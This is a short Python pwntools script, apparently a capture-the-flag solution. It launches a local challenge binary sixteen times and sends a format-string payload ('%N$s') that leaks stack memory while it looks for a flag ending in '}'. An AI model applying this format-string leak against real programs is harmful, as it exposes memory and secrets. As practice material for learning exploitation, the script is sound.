from pwn import *

for i in range(16):
    io = process('./bins2/bin-printfr-6')
    io.recvuntil(b'>>>')
    io.sendline(b'%' + str(i).encode('utf-8') + b'$s')
    try:
        io.recvuntil('}')
    except:
        next
    io.close()

